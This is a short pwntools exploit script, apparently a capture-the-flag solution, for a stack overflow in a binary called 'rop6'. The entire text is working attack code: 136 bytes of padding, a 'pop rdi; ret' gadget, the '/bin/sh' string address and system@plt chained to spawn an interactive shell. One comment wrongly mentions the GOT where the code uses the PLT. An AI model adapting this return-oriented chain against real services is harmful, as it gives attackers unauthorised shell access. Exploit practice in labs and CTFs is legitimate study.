from pwn import *

binary = ELF('./rop6')

# Find the offset to the return address
offset = 128 + 8  # buf size + saved rip

# Get the address of "/bin/sh" in the binary data section
bin_sh = next(binary.search(b'/bin/sh'))

# Get the address of the 'system' function from the GOT
system_plt = binary.plt['system']

# Find a 'pop rdi; ret' gadget to set up the argument for system()
pop_rdi_ret = next(binary.search(asm('pop rdi; ret')))

# Build the rop chain
rop_chain = flat([
    b'A' * offset,  # padding to reach return address
    pop_rdi_ret,   # gadget to pop the next value into RDI
    bin_sh,        # address of "/bin/sh"
    system_plt     # call system with RDI pointing to "/bin/sh"
])

# Start a process or connect to remote service
io = process(binary.path)

# Send the rop chain
io.sendline(rop_chain)

# Drop to an interactive shell
io.interactive()
